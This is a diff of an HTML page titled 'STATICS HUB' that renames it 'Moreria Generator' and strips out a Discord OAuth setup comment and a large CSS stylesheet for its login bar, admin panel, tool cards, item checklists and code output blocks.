@@ -3,1594 +3,10 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>STATICS HUB - Choose Your Tool</title>
-<!--
-  ╔══════════════════════════════════════════════════════════╗
-  ║  DISCORD OAUTH2 SETUP (required for login to work)      ║
-  ║  1. Go to https://discord.com/developers/applications   ║
-  ║  2. Create a new application                            ║
-  ║  3. Go to OAuth2 → Add Redirect URI = your page URL    ║
-  ║  4. Copy Client ID and paste it below                   ║
-  ╚══════════════════════════════════════════════════════════╝
--->
+<title>STATICS HUB - Moreria Generator</title>
 <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Share+Tech+Mono&family=Space+Grotesk:wght@500;600;700&display=swap" rel="stylesheet">
 <style>
   *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-  :root {
-    --bg: #050505;
-    --surface: #0c0c0c;
-    --panel: #111111;
-    --border: #292929;
-    --neon: #f5f5f5;
-    --neon-glow: 0 0 18px rgba(255,255,255,0.16);
-    --text: #f2f2f2;
-    --muted: #8d8d8d;
-    --danger: #d9d9d9;
-    --green: #f5f5f5;
-    --discord: #f5f5f5;
-  }
-  body {
-    background: var(--bg);
-    color: var(--text);
-    font-family: 'DM Sans', sans-serif;
-    min-height: 100vh;
-    overflow-x: hidden;
-    position: relative;
-  }
-  body::before {
-    content: '';
-    position: fixed;
-    inset: 0;
-    background-image:
-      linear-gradient(rgba(255,255,255,0.035) 1px, transparent 1px),
-      linear-gradient(90deg, rgba(255,255,255,0.035) 1px, transparent 1px);
-    background-size: 42px 42px;
-    pointer-events: none;
-    z-index: 0;
-    animation: gridDrift 32s infinite linear;
-  }
-  @keyframes gridDrift { 0% { transform: translate(0,0); } 100% { transform: translate(42px,42px); } }
-
-  /* ═══ TOP BAR ═══ */
-  .top-bar {
-    position: fixed;
-    top: 0; left: 0; right: 0;
-    height: 52px;
-    background: rgba(10,0,0,0.92);
-    border-bottom: 1px solid var(--border);
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    padding: 0 1rem;
-    z-index: 500;
-    backdrop-filter: blur(10px);
-  }
-  .counter-widget {
-    display: flex;
-    align-items: center;
-    gap: 0.5rem;
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.72rem;
-    text-transform: uppercase;
-    letter-spacing: 0.1em;
-    color: var(--muted);
-  }
-  .counter-widget .counter-num {
-    font-size: 1rem;
-    color: var(--neon);
-    text-shadow: var(--neon-glow);
-    font-weight: bold;
-  }
-  .counter-dot {
-    width: 6px; height: 6px;
-    border-radius: 50%;
-    background: var(--neon);
-    box-shadow: var(--neon-glow);
-    animation: blink 2s infinite;
-  }
-  .login-area {
-    display: flex;
-    align-items: center;
-    gap: 0.6rem;
-  }
-  .btn-discord {
-    display: flex;
-    align-items: center;
-    gap: 0.5rem;
-    padding: 0.4rem 0.9rem;
-    background: var(--discord);
-    border: none;
-    border-radius: 7px;
-    color: white;
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.72rem;
-    text-transform: uppercase;
-    letter-spacing: 0.08em;
-    cursor: pointer;
-    transition: all 0.2s;
-    box-shadow: 0 0 10px rgba(88,101,242,0.4);
-  }
-  .btn-discord:hover { background: #4752c4; box-shadow: 0 0 18px rgba(88,101,242,0.6); }
-  .btn-discord svg { width:16px; height:16px; }
-  .user-chip {
-    display: none;
-    align-items: center;
-    gap: 0.5rem;
-    background: rgba(255,30,30,0.08);
-    border: 1px solid var(--border);
-    border-radius: 8px;
-    padding: 0.3rem 0.7rem;
-  }
-  .user-chip.show { display: flex; }
-  .user-avatar {
-    width: 26px; height: 26px;
-    border-radius: 50%;
-    object-fit: cover;
-    border: 1px solid var(--neon);
-    background: var(--surface);
-  }
-  .user-name {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.72rem;
-    color: var(--text);
-  }
-  .user-role-badge {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.6rem;
-    padding: 1px 5px;
-    border-radius: 3px;
-    text-transform: uppercase;
-    letter-spacing: 0.05em;
-    font-weight: bold;
-  }
-  .btn-logout {
-    padding: 0.3rem 0.6rem;
-    background: rgba(255,68,68,0.15);
-    border: 1px solid rgba(255,68,68,0.4);
-    border-radius: 5px;
-    color: var(--danger);
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.62rem;
-    text-transform: uppercase;
-    cursor: pointer;
-    transition: background 0.2s;
-  }
-  .btn-logout:hover { background: rgba(255,68,68,0.28); }
-  .btn-admin {
-    padding: 0.3rem 0.6rem;
-    background: rgba(255,30,30,0.15);
-    border: 1px solid var(--neon);
-    border-radius: 5px;
-    color: var(--neon);
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.62rem;
-    text-transform: uppercase;
-    cursor: pointer;
-    transition: background 0.2s;
-    text-shadow: var(--neon-glow);
-    display: none;
-  }
-  .btn-admin:hover { background: rgba(255,30,30,0.28); }
-  .btn-admin.show { display: block; }
-
-  /* ═══ MODALS ═══ */
-  .modal-overlay {
-    position: fixed;
-    inset: 0;
-    background: rgba(0,0,0,0.82);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    z-index: 2000;
-    backdrop-filter: blur(4px);
-  }
-  .modal-overlay.hidden { display: none; }
-  .modal-box {
-    background: var(--panel);
-    border: 1px solid var(--neon);
-    border-radius: 14px;
-    padding: 2rem;
-    max-width: 420px;
-    width: 90%;
-    text-align: center;
-    box-shadow: 0 0 30px rgba(255,30,30,0.2);
-    animation: fadeUp 0.3s ease both;
-  }
-  .modal-box h2 {
-    font-size: 1.5rem;
-    font-weight: 700;
-    color: var(--neon);
-    text-shadow: var(--neon-glow);
-    letter-spacing: 0.1em;
-    text-transform: uppercase;
-    margin-bottom: 0.7rem;
-  }
-  .modal-box p {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.78rem;
-    color: var(--muted);
-    line-height: 1.6;
-    margin-bottom: 1.5rem;
-  }
-  .modal-btns {
-    display: flex;
-    gap: 0.7rem;
-    justify-content: center;
-    flex-wrap: wrap;
-  }
-  .btn-cancel {
-    padding: 0.55rem 1.1rem;
-    background: rgba(255,255,255,0.05);
-    border: 1px solid var(--border);
-    border-radius: 8px;
-    color: var(--muted);
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.72rem;
-    text-transform: uppercase;
-    cursor: pointer;
-    transition: background 0.2s;
-  }
-  .btn-cancel:hover { background: rgba(255,255,255,0.1); }
-
-  /* ═══ ADMIN PANEL ═══ */
-  .admin-modal-box {
-    background: var(--panel);
-    border: 1px solid var(--neon);
-    border-radius: 14px;
-    width: 92%;
-    max-width: 680px;
-    max-height: 85vh;
-    overflow: hidden;
-    display: flex;
-    flex-direction: column;
-    box-shadow: 0 0 40px rgba(255,30,30,0.25);
-    animation: fadeUp 0.3s ease both;
-  }
-  .admin-header {
-    padding: 1rem 1.4rem;
-    background: var(--surface);
-    border-bottom: 1px solid var(--border);
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-  }
-  .admin-header h2 {
-    font-size: 1.1rem;
-    font-weight: 700;
-    color: var(--neon);
-    text-shadow: var(--neon-glow);
-    letter-spacing: 0.1em;
-    text-transform: uppercase;
-  }
-  .admin-close {
-    width: 28px; height: 28px;
-    border: 1px solid var(--border);
-    border-radius: 6px;
-    background: rgba(255,30,30,0.1);
-    color: var(--neon);
-    font-size: 1rem;
-    cursor: pointer;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    transition: background 0.2s;
-  }
-  .admin-close:hover { background: rgba(255,30,30,0.3); }
-  .admin-tabs {
-    display: flex;
-    border-bottom: 1px solid var(--border);
-  }
-  .admin-tab {
-    flex: 1;
-    padding: 0.7rem;
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.72rem;
-    text-transform: uppercase;
-    letter-spacing: 0.08em;
-    text-align: center;
-    cursor: pointer;
-    color: var(--muted);
-    transition: color 0.2s, background 0.2s;
-    border: none;
-    background: none;
-  }
-  .admin-tab.active {
-    color: var(--neon);
-    text-shadow: var(--neon-glow);
-    background: rgba(255,30,30,0.07);
-    border-bottom: 2px solid var(--neon);
-  }
-  .admin-body { flex: 1; overflow-y: auto; padding: 1.2rem; }
-  .admin-tab-pane { display: none; }
-  .admin-tab-pane.active { display: block; }
-
-  /* Roles tab */
-  .role-form {
-    display: flex;
-    gap: 0.6rem;
-    align-items: center;
-    margin-bottom: 1rem;
-    flex-wrap: wrap;
-  }
-  .role-name-input {
-    flex: 1;
-    min-width: 140px;
-    background: var(--surface);
-    border: 1px solid var(--border);
-    border-radius: 7px;
-    padding: 0.5rem 0.8rem;
-    color: var(--text);
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.8rem;
-    outline: none;
-    transition: border-color 0.2s;
-  }
-  .role-name-input:focus { border-color: var(--neon); }
-  .role-color-input {
-    width: 40px; height: 36px;
-    border: 1px solid var(--border);
-    border-radius: 7px;
-    background: var(--surface);
-    cursor: pointer;
-    padding: 2px;
-  }
-  .btn-add-role {
-    padding: 0.5rem 0.9rem;
-    background: rgba(255,30,30,0.15);
-    border: 1px solid var(--neon);
-    border-radius: 7px;
-    color: var(--neon);
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.68rem;
-    text-transform: uppercase;
-    cursor: pointer;
-    white-space: nowrap;
-    transition: background 0.2s;
-    text-shadow: var(--neon-glow);
-  }
-  .btn-add-role:hover { background: rgba(255,30,30,0.3); }
-  .roles-list { display: flex; flex-direction: column; gap: 0.5rem; }
-  .role-row {
-    display: flex;
-    align-items: center;
-    gap: 0.7rem;
-    padding: 0.55rem 0.8rem;
-    background: var(--surface);
-    border: 1px solid var(--border);
-    border-radius: 8px;
-  }
-  .role-color-dot {
-    width: 12px; height: 12px;
-    border-radius: 50%;
-    flex-shrink: 0;
-  }
-  .role-row-name {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.8rem;
-    flex: 1;
-    color: var(--text);
-  }
-  .btn-del-role {
-    padding: 0.2rem 0.5rem;
-    background: rgba(255,68,68,0.12);
-    border: 1px solid rgba(255,68,68,0.3);
-    border-radius: 5px;
-    color: var(--danger);
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.6rem;
-    text-transform: uppercase;
-    cursor: pointer;
-    transition: background 0.2s;
-  }
-  .btn-del-role:hover { background: rgba(255,68,68,0.28); }
-
-  /* Users tab */
-  .admin-section-title {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.68rem;
-    text-transform: uppercase;
-    letter-spacing: 0.1em;
-    color: var(--muted);
-    margin-bottom: 0.7rem;
-  }
-  .user-rank-row {
-    display: flex;
-    align-items: center;
-    gap: 0.7rem;
-    padding: 0.55rem 0.8rem;
-    background: var(--surface);
-    border: 1px solid var(--border);
-    border-radius: 8px;
-    margin-bottom: 0.5rem;
-  }
-  .user-rank-avatar {
-    width: 30px; height: 30px;
-    border-radius: 50%;
-    object-fit: cover;
-    background: var(--panel);
-    border: 1px solid var(--border);
-    flex-shrink: 0;
-  }
-  .user-rank-name {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.8rem;
-    color: var(--text);
-    flex: 1;
-  }
-  .role-select {
-    background: var(--panel);
-    border: 1px solid var(--border);
-    border-radius: 6px;
-    padding: 0.3rem 0.5rem;
-    color: var(--text);
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.7rem;
-    outline: none;
-    cursor: pointer;
-    transition: border-color 0.2s;
-  }
-  .role-select:focus { border-color: var(--neon); }
-  .btn-assign-role {
-    padding: 0.3rem 0.6rem;
-    background: rgba(255,30,30,0.12);
-    border: 1px solid rgba(255,30,30,0.4);
-    border-radius: 5px;
-    color: var(--neon);
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.62rem;
-    text-transform: uppercase;
-    cursor: pointer;
-    white-space: nowrap;
-    transition: background 0.2s;
-  }
-  .btn-assign-role:hover { background: rgba(255,30,30,0.28); }
-  .admin-empty {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.75rem;
-    color: var(--muted);
-    text-align: center;
-    padding: 2rem;
-    font-style: italic;
-  }
-
-  /* ═══ MAIN CONTENT ═══ */
-  .home-screen {
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    min-height: 100vh;
-    text-align: center;
-    padding: 5rem 2rem 2rem;
-    z-index: 1;
-    position: relative;
-  }
-  .home-title {
-    font-size: clamp(3rem, 8vw, 6rem);
-    font-weight: 700;
-    color: var(--neon);
-    text-shadow: var(--neon-glow);
-    letter-spacing: 0.1em;
-    margin-bottom: 0.5rem;
-    animation: fadeDown 0.6s ease both;
-  }
-  .home-subtitle {
-    font-size: clamp(2rem, 5vw, 4rem);
-    font-weight: 700;
-    color: var(--neon);
-    text-shadow: var(--neon-glow);
-    letter-spacing: 0.1em;
-    margin-bottom: 1rem;
-    animation: fadeDown 0.6s ease both 0.1s both;
-  }
-  .home-subtitle-sub {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.9rem;
-    color: var(--muted);
-    margin-bottom: 3rem;
-    letter-spacing: 0.1em;
-    animation: fadeDown 0.6s ease both 0.2s both;
-  }
-  .tool-selector {
-    display: flex;
-    gap: 2rem;
-    flex-wrap: wrap;
-    justify-content: center;
-    animation: fadeUp 0.6s ease both 0.3s both;
-  }
-  .tool-card {
-    background: var(--panel);
-    border: 1px solid var(--border);
-    border-radius: 12px;
-    padding: 2rem;
-    width: 280px;
-    cursor: pointer;
-    transition: all 0.3s ease;
-    box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-    position: relative;
-    overflow: hidden;
-  }
-  .tool-card::before {
-    content: '';
-    position: absolute;
-    top: 0; left: 0; right: 0;
-    height: 2px;
-    background: linear-gradient(to right, transparent, var(--neon), transparent);
-    transform: scaleX(0);
-    transition: transform 0.3s ease;
-  }
-  .tool-card:hover {
-    border-color: var(--neon);
-    box-shadow: 0 0 20px rgba(255,30,30,0.2);
-    transform: translateY(-4px);
-  }
-  .tool-card:hover::before { transform: scaleX(1); }
-  .tool-icon { height: 80px; display: flex; align-items: center; justify-content: center; margin-bottom: 1rem; }
-  .tool-icon img { max-height: 100%; max-width: 100%; object-fit: contain; }
-  .tool-name {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 1.1rem;
-    text-transform: uppercase;
-    letter-spacing: 0.1em;
-    color: var(--neon);
-    text-shadow: var(--neon-glow);
-    margin-bottom: 0.5rem;
-  }
-  .tool-desc { font-family: 'Share Tech Mono', monospace; font-size: 0.75rem; color: var(--muted); line-height: 1.6; }
-  @keyframes fadeDown { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: none; } }
-  @keyframes fadeUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: none; } }
-  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-  .content-area { display: none; animation: fadeIn 0.4s ease both; min-height: 100vh; padding: 2rem 0; }
-  .content-area.active { display: block; }
-  .back-button {
-    position: fixed;
-    top: 62px; left: 20px;
-    z-index: 400;
-    padding: 0.7rem 1.2rem;
-    background: var(--panel);
-    border: 1px solid var(--neon);
-    border-radius: 8px;
-    color: var(--neon);
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.8rem;
-    text-transform: uppercase;
-    cursor: pointer;
-    transition: all 0.2s;
-    text-decoration: none;
-    display: flex;
-    align-items: center;
-    gap: 0.5rem;
-    box-shadow: var(--neon-glow);
-  }
-  .back-button:hover { background: rgba(255,30,30,0.15); box-shadow: 0 0 15px rgba(255,30,30,0.5); }
-  .toast {
-    position: fixed;
-    bottom: 1.5rem;
-    left: 50%;
-    transform: translateX(-50%) translateY(80px);
-    background: var(--panel);
-    border: 1px solid var(--border);
-    border-radius: 10px;
-    padding: 0.75rem 1.4rem;
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.72rem;
-    color: var(--text);
-    z-index: 999;
-    transition: transform 0.3s ease, opacity 0.3s ease;
-    opacity: 0;
-    white-space: nowrap;
-    box-shadow: 0 4px 20px rgba(0,0,0,0.5);
-  }
-  .toast.show { transform: translateX(-50%) translateY(0); opacity: 1; }
-  .toast.success { border-color: var(--green); color: var(--green); }
-  .toast.error { border-color: var(--danger); color: var(--danger); }
-  .tool-wrapper { max-width: 860px; margin: 0 auto; padding: 5rem 1.5rem 2rem; position: relative; z-index: 1; }
-  .tool-header { text-align: center; margin-bottom: 2rem; animation: fadeDown 0.55s ease both; }
-  .tool-header h1 {
-    font-size: clamp(1.7rem, 4vw, 2.7rem);
-    font-weight: 700;
-    letter-spacing: 0.1em;
-    text-transform: uppercase;
-    color: var(--neon);
-    text-shadow: var(--neon-glow);
-    line-height: 1;
-  }
-  .tool-header .tagline { font-family: 'Share Tech Mono', monospace; font-size: 0.75rem; letter-spacing: 0.18em; text-transform: uppercase; color: var(--muted); margin-top: 0.4rem; }
-  .panel {
-    background: var(--panel);
-    border: 1px solid var(--border);
-    border-radius: 12px;
-    overflow: hidden;
-    margin-bottom: 1.2rem;
-    animation: fadeUp 0.5s ease both;
-    box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-  }
-  .panel:nth-child(1) { animation-delay: 0.05s; }
-  .panel:nth-child(2) { animation-delay: 0.13s; }
-  .panel:nth-child(3) { animation-delay: 0.21s; }
-  .panel:nth-child(4) { animation-delay: 0.29s; }
-  .ph { display: flex; align-items: center; gap: 0.6rem; padding: 0.75rem 1.25rem; background: var(--surface); border-bottom: 1px solid var(--border); }
-  .dot { width: 7px; height: 7px; border-radius: 50%; flex-shrink: 0; animation: blink 2.2s infinite; box-shadow: var(--neon-glow); }
-  .dot-cyan { background: var(--neon); }
-  .dot-purple { background: var(--neon); animation-delay: 0.4s; }
-  .dot-discord { background: var(--neon); animation-delay: 0.8s; }
-  .dot-green { background: var(--green); animation-delay: 1.2s; }
-  @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
-  .ph-title { font-family: 'Share Tech Mono', monospace; font-size: 0.72rem; text-transform: uppercase; letter-spacing: 0.15em; color: var(--neon); text-shadow: var(--neon-glow); }
-  .pb { padding: 1.25rem; }
-  .lbl { display: block; font-family: 'Share Tech Mono', monospace; font-size: 0.68rem; text-transform: uppercase; letter-spacing: 0.13em; color: var(--muted); margin-bottom: 0.45rem; }
-  .search-row { display: flex; gap: 0.6rem; margin-bottom: 0.75rem; }
-  .search-input {
-    flex: 1;
-    background: var(--surface);
-    border: 1px solid var(--border);
-    border-radius: 7px;
-    padding: 0.55rem 0.85rem;
-    color: var(--text);
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.82rem;
-    outline: none;
-    transition: border-color 0.2s, box-shadow 0.2s;
-  }
-  .search-input:focus { border-color: var(--neon); box-shadow: 0 0 10px rgba(255,30,30,0.3); }
-  .search-input::placeholder { color: var(--muted); }
-  .btn-sm {
-    padding: 0.5rem 0.9rem;
-    background: rgba(255,30,30,0.1);
-    border: 1px solid var(--neon);
-    border-radius: 7px;
-    color: var(--neon);
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.68rem;
-    text-transform: uppercase;
-    letter-spacing: 0.08em;
-    cursor: pointer;
-    white-space: nowrap;
-    transition: background 0.2s;
-    text-shadow: var(--neon-glow);
-  }
-  .btn-sm:hover { background: rgba(255,30,30,0.22); }
-  .btn-sm.red { color: var(--danger); border-color: rgba(255,68,68,0.5); background: rgba(255,68,68,0.1); }
-  .btn-sm.red:hover { background: rgba(255,68,68,0.2); }
-  .animal-list { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; height: 240px; overflow-y: auto; scrollbar-width: thin; scrollbar-color: var(--neon) transparent; }
-  .animal-list::-webkit-scrollbar { width: 4px; }
-  .animal-list::-webkit-scrollbar-thumb { background: var(--neon); border-radius: 4px; }
-  .a-item { display: flex; align-items: center; gap: 0.65rem; padding: 0.48rem 0.9rem; cursor: pointer; border-bottom: 1px solid rgba(255,30,30,0.05); transition: background 0.12s; user-select: none; }
-  .a-item:last-child { border-bottom: none; }
-  .a-item:hover { background: rgba(255,30,30,0.06); }
-  .a-item.on { background: rgba(255,30,30,0.12); }
-  .a-item input[type="checkbox"] {
-    -webkit-appearance: none; appearance: none;
-    width: 13px; height: 13px;
-    border: 1px solid var(--neon); border-radius: 3px;
-    background: var(--surface); cursor: pointer;
-    flex-shrink: 0; position: relative; outline: none;
-    transition: background 0.2s, border-color 0.2s;
-  }
-  .a-item input[type="checkbox"]:checked { background: var(--neon); border-color: var(--neon); box-shadow: var(--neon-glow); }
-  .a-item input[type="checkbox"]:checked::after { content: '\2713'; position: absolute; color: black; font-size: 8px; font-weight: bold; top: 50%; left: 50%; transform: translate(-50%,-55%); }
-  .a-name { font-size: 0.88rem; line-height: 1.2; flex: 1; color: var(--text); }
-  .a-meta { font-family: 'Share Tech Mono', monospace; font-size: 0.68rem; color: var(--muted); text-align: right; min-width: 90px; }
-  .badge-og { font-size: 10px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; padding: 2px 6px; border-radius: 4px; background: rgba(255,30,30,0.15); color: var(--neon); border: 1px solid var(--neon); margin-left: 8px; cursor: default; text-shadow: var(--neon-glow); }
-  .badge-secret { font-size: 10px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; padding: 2px 6px; border-radius: 4px; background: rgba(255,255,255,0.05); color: var(--text); border: 1px solid rgba(255,255,255,0.2); margin-left: 8px; cursor: default; }
-  .meta-row { display: flex; justify-content: space-between; align-items: center; margin-top: 0.6rem; }
-  .sel-count { font-family: 'Share Tech Mono', monospace; font-size: 0.7rem; color: var(--muted); }
-  .sel-count span { color: var(--neon); }
-  .txt { width: 100%; background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 0.72rem 1rem; color: var(--text); font-family: 'Share Tech Mono', monospace; font-size: 0.88rem; outline: none; transition: border-color 0.2s, box-shadow 0.2s; }
-  .txt:focus { border-color: var(--neon); box-shadow: 0 0 10px rgba(255,30,30,0.3); }
-  .txt::placeholder { color: var(--muted); }
-  .hint { font-family: 'Share Tech Mono', monospace; font-size: 0.67rem; color: var(--muted); margin-top: 0.4rem; }
-  .error { color: var(--danger) !important; font-weight: bold; }
-  .btn-gen {
-    display: block; width: 100%; padding: 0.92rem;
-    background: var(--neon); border: none; border-radius: 10px;
-    color: black; font-family: 'Rajdhani', sans-serif;
-    font-size: 1.1rem; font-weight: 700; letter-spacing: 0.14em;
-    text-transform: uppercase; cursor: pointer; transition: all 0.2s;
-    box-shadow: var(--neon-glow); margin-bottom: 1.2rem;
-  }
-  .btn-gen:hover { box-shadow: 0 0 20px rgba(255,30,30,0.7); transform: translateY(-1px); }
-  .btn-gen:active { transform: none; }
-  .out-ph { display: flex; align-items: center; gap: 0.6rem; padding: 0.75rem 1.25rem; background: var(--surface); border-bottom: 1px solid var(--border); }
-  .out-ph-title { font-family: 'Share Tech Mono', monospace; font-size: 0.72rem; text-transform: uppercase; letter-spacing: 0.15em; color: var(--neon); text-shadow: var(--neon-glow); }
-  .btn-copy { margin-left: auto; padding: 0.26rem 0.7rem; background: rgba(255,30,30,0.1); border: 1px solid var(--neon); border-radius: 6px; color: var(--neon); font-family: 'Share Tech Mono', monospace; font-size: 0.68rem; text-transform: uppercase; letter-spacing: 0.1em; cursor: pointer; transition: all 0.2s; text-shadow: var(--neon-glow); }
-  .btn-copy:hover { background: rgba(255,30,30,0.22); }
-  .btn-copy.ok { color: var(--green); border-color: var(--green); background: rgba(0,255,136,0.1); }
-  .code-block { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 1rem 1.2rem; font-family: 'Share Tech Mono', monospace; font-size: 0.79rem; line-height: 1.8; color: var(--text); min-height: 120px; max-height: 480px; overflow-y: auto; white-space: pre; overflow-x: auto; scrollbar-width: thin; scrollbar-color: var(--border) transparent; }
-  .code-block.empty { color: var(--muted); font-style: italic; white-space: pre-wrap; }
-  .admin-mode-selector { display: flex; gap: 0.5rem; margin-bottom: 1rem; flex-wrap: wrap; }
-  .admin-mode-btn { flex: 1; min-width: 80px; padding: 0.5rem; background: rgba(255,30,30,0.08); border: 1px solid var(--neon); border-radius: 7px; color: var(--neon); font-family: 'Share Tech Mono', monospace; font-size: 0.68rem; text-transform: uppercase; letter-spacing: 0.08em; cursor: pointer; transition: all 0.2s; text-shadow: var(--neon-glow); }
-  .admin-mode-btn.active { background: var(--neon); color: black; border-color: var(--neon); box-shadow: var(--neon-glow); }
-  .admin-mode-btn:hover:not(.active) { background: rgba(255,30,30,0.2); }
-  #customAdminInput { display: none; margin-top: 1rem; }
-  #customBrainrotInput { display: flex; gap: 0.5rem; margin-top: 1rem; }
-  #customBrainrotInput input { flex: 1; background: var(--surface); border: 1px solid var(--border); border-radius: 7px; padding: 0.55rem 0.85rem; color: var(--text); font-family: 'Share Tech Mono', monospace; font-size: 0.82rem; outline: none; }
-  #customBrainrotInput button { padding: 0.5rem 0.9rem; background: rgba(255,30,30,0.1); border: 1px solid var(--neon); border-radius: 7px; color: var(--neon); font-family: 'Share Tech Mono', monospace; font-size: 0.68rem; text-transform: uppercase; cursor: pointer; white-space: nowrap; text-shadow: var(--neon-glow); }
-  #pasteCustomListContainer { margin-top: 1rem; }
-  #pasteCustomListContainer textarea { width: 100%; background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 0.72rem 1rem; color: var(--text); font-family: 'Share Tech Mono', monospace; font-size: 0.88rem; min-height: 100px; resize: vertical; outline: none; transition: border-color 0.2s; }
-  #pasteCustomListContainer textarea:focus { border-color: var(--neon); }
-  #pasteCustomListContainer button { margin-top: 0.5rem; padding: 0.5rem 0.9rem; background: rgba(255,30,30,0.1); border: 1px solid var(--neon); border-radius: 7px; color: var(--neon); font-family: 'Share Tech Mono', monospace; font-size: 0.68rem; text-transform: uppercase; cursor: pointer; white-space: nowrap; text-shadow: var(--neon-glow); }
-  .gag2-panel { background: var(--panel); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; margin-bottom: 1.2rem; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
-  .gag2-ph { display: flex; align-items: center; gap: 0.6rem; padding: 0.75rem 1.25rem; background: var(--surface); border-bottom: 1px solid var(--border); }
-  .gag2-dot { width: 7px; height: 7px; border-radius: 50%; background: var(--neon); box-shadow: var(--neon-glow); }
-  .gag2-ph-title { font-family: 'Share Tech Mono', monospace; font-size: 0.72rem; text-transform: uppercase; letter-spacing: 0.15em; color: var(--neon); text-shadow: var(--neon-glow); }
-  .gag2-pb { padding: 1.25rem; }
-  .gag2-lbl { display: block; font-family: 'Share Tech Mono', monospace; font-size: 0.68rem; text-transform: uppercase; color: var(--muted); margin-bottom: 0.45rem; }
-  .gag2-f-field { position: relative; margin-bottom: 1.1rem; }
-  .gag2-f-input { width: 100%; background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 0.65rem 0.95rem; color: var(--text); font-family: 'Share Tech Mono', monospace; font-size: 0.88rem; outline: none; }
-  .gag2-f-input:focus { border-color: var(--neon); box-shadow: 0 0 12px rgba(255,30,30,0.2); }
-  .gag2-f-hint { font-family: 'Share Tech Mono', monospace; font-size: 0.62rem; color: var(--muted); margin-top: 0.35rem; display: block; }
-  .gag2-f-hint.error { color: var(--danger); }
-  .gag2-admin-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 0.5rem; margin-bottom: 0.75rem; }
-  .gag2-admin-mode-btn { background: var(--surface); border: 1px solid var(--border); border-radius: 7px; padding: 0.55rem; color: var(--muted); font-family: 'Share Tech Mono', monospace; font-size: 0.68rem; text-transform: uppercase; cursor: pointer; text-align: center; transition: all 0.2s; }
-  .gag2-admin-mode-btn.active { background: rgba(255,30,30,0.08); border-color: var(--neon); color: var(--neon); text-shadow: var(--neon-glow); }
-  .gag2-btn-gen { width: 100%; padding: 0.85rem; background: var(--neon); border: none; border-radius: 9px; color: black; font-family: 'Rajdhani', sans-serif; font-size: 1.1rem; font-weight: 700; text-transform: uppercase; cursor: pointer; box-shadow: var(--neon-glow); transition: all 0.2s; }
-  .gag2-btn-gen:hover { box-shadow: 0 0 20px rgba(255,30,30,0.7); transform: translateY(-1px); }
-  .gag2-output-container { position: relative; margin-top: 1.2rem; }
-  .gag2-code-block { background: #0a0000; border: 1px solid var(--border); border-radius: 10px; padding: 1.2rem; font-family: 'Share Tech Mono', monospace; font-size: 0.78rem; color: var(--neon); white-space: pre-wrap; word-break: break-all; min-height: 54px; }
-  .gag2-code-block.empty { color: var(--muted); font-style: italic; text-align: center; }
-  .gag2-btn-copy { position: absolute; top: 8px; right: 8px; padding: 0.3rem 0.65rem; background: rgba(0,0,0,0.6); border: 1px solid var(--border); border-radius: 5px; color: var(--muted); font-family: 'Share Tech Mono', monospace; font-size: 0.62rem; text-transform: uppercase; cursor: pointer; transition: all 0.2s; }
-  .gag2-btn-copy.ok { border-color: var(--green); color: var(--green); }
-  #gag2-usernameSuggestions, #usernameSuggestions { position: absolute; bottom: 100%; left: 0; right: 0; background: var(--surface); border: 1px solid var(--border); border-radius: 8px; max-height: 200px; overflow-y: auto; z-index: 100; display: none; }
-  .gag2-suggestion-item, .suggestion-item { padding: 10px; cursor: pointer; display: flex; align-items: center; gap: 10px; border-bottom: 1px solid rgba(255,255,255,0.02); transition: background 0.12s; }
-  .gag2-suggestion-item:hover, .suggestion-item:hover { background: rgba(255,30,30,0.06); }
-  .gag2-suggestion-avatar, .suggestion-avatar { width: 32px; height: 32px; border-radius: 50%; overflow: hidden; background: #1a0000; }
-  .gag2-suggestion-avatar img, .suggestion-avatar img { width: 100%; height: 100%; object-fit: cover; }
-  .gag2-suggestion-info, .suggestion-info { flex: 1; }
-  .gag2-suggestion-username, .suggestion-username { font-size: 0.85rem; font-weight: 600; color: #fff; }
